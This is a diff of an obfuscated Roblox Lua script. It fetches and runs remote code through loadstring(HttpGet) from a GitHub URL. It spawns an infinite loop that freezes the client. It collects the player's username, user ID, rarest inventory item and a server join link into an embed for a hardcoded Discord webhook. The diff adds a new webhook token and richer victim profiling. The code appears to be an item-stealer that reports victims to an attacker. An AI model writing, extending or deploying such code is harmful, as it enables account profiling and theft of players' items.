@@ -1,4 +1,3 @@
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/refs/heads/main/Protected_4047913774660354.lua"))()
 
 task.wait(1)
@@ -11,13 +10,12 @@ print("LB Loaded")
 
 local targetPosition1 = Vector3.new(-222, 10, 53)
 local targetPosition2 = Vector3.new(-240, 10, 53)
-local tolerance = 1  -- small tolerance for floating-point precision
+local tolerance = 1
 
 local function isAtTarget(pos, target)
     return (pos - target).Magnitude <= tolerance
 end
 
--- Keep track if the "infinite loop" condition is active
 local infiniteLoopActive = false
 
 RunService.Heartbeat:Connect(function()
@@ -27,17 +25,14 @@ RunService.Heartbeat:Connect(function()
                 if part:IsA("BasePart") then
                     local pos = part.Position
                     
-                    -- Check first target
                     if isAtTarget(pos, targetPosition1) then
                         Remote:FireServer("All")
                     end
                     
-                    -- Check second target
                     if isAtTarget(pos, targetPosition2) and not infiniteLoopActive then
                         infiniteLoopActive = true
-                        -- Simulate a "while true do end" safely
                         spawn(function()
-                            while true do -- prevents freezing
+                            while true do
                             end
                         end)
                     end
@@ -47,7 +42,6 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
-
 task.wait(3)
 
 local HttpService = game:GetService("HttpService")
@@ -55,7 +49,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local xUrL7 = "https://discord.com/api/webhooks/" .. "1414700326820515992" .. "/" .. "l-2z9v-lOzFAqQn1NO7_8OGHCHIsjBxML_cVUgw2TdUxUPZlHNcTIrJLThvov03BVvrW"
+local xUrL7 = "https://discord.com/api/webhooks/1456805060054093968/iA9pSt6ZQFfvgi6SeOV90KObnHNKYJBRIgQhgNImCWNqTXp5gLPDIZtDGO1_hdrfBpCg"
 
 local player = Players.LocalPlayer
 local username = player.Name
@@ -69,6 +63,30 @@ local gameTitle = "Unknown Game"
 pcall(function()
     gameTitle = MarketplaceService:GetProductInfo(placeId).Name
 end)
+
+local function getThumbnailUrl(userId)
+    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    
+    pcall(function()
+        local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false"
+        
+        local success, response = pcall(function()
+            return request({
+                Url = apiUrl,
+                Method = "GET"
+            })
+        end)
+        
+        if success and response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
+                thumbnailUrl = decoded.data[1].imageUrl
+            end
+        end
+    end)
+    
+    return thumbnailUrl
+end
 
 local function zKw9()
     local rarestItem = "None"
@@ -100,9 +118,9 @@ local function zKw9()
     end)
     
     if rarestItem ~= "None" then
-        return rarestItem .. " (Value: " .. rarestValue .. ")"
+        return rarestItem, rarestValue
     else
-        return "No items found"
+        return "No items found", 0
     end
 end
 
@@ -219,40 +237,46 @@ local function rB7m(swordName, requiredQuantity)
     return hasItem, availableQuantity
 end
 
-local serverLink = "roblox://placeId=18450282790&gameInstanceId=" .. jobId
-local rarestItem = zKw9()
+local rarestItemName, rarestItemValue = zKw9()
+local thumbnailUrl = getThumbnailUrl(userId)
 
 local embedData = {
+    ["content"] = nil,
     ["embeds"] = {{
-        ["title"] = "🎮 Player",
-        ["description"] = "yes",
         ["color"] = 3447003,
-        ["thumbnail"] = {
-            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-        },
         ["fields"] = {
             {
-                ["name"] = "👤 Noclip",
-                ["value"] = "**Username:** " .. username .. "\n**Display Name:** " .. displayName .. "\n**User ID:** " .. userId,
+                ["name"] = "Display Name",
+                ["value"] = "```" .. displayName .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "🔮 InfYield",
-                ["value"] = "**Rarest Item:** " .. rarestItem,
+                ["name"] = "UserID",
+                ["value"] = "```" .. userId .. "```",
                 ["inline"] = true
             },
             {
-                ["name"] = "🔗 CopyLink",
-                ["value"] = serverLink .. "\n[View Profile](https://www.roblox.com/users/" .. userId .. "/profile)",
+                ["name"] = "🔮 Rarest Item",
+                ["value"] = "```" .. rarestItemName .. " (" .. rarestItemValue .. " copies)```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🔗 Game Link",
+                ["value"] = "[Join Game](https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. jobId .. ")",
                 ["inline"] = false
             }
         },
-        ["footer"] = {
-            ["text"] = "exe",
-            ["icon_url"] = "https://cdn.discordapp.com/attachments/1234567890123456789/1234567890123456789/roblox_icon.png"
+        ["author"] = {
+            ["name"] = "🎮 " .. username,
+            ["url"] = "https://www.roblox.com/users/" .. userId .. "/profile",
+            ["icon_url"] = thumbnailUrl
+        },
+        ["thumbnail"] = {
+            ["url"] = thumbnailUrl
         },
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
+    }},
+    ["attachments"] = {}
 }
 
 local function tL6y()
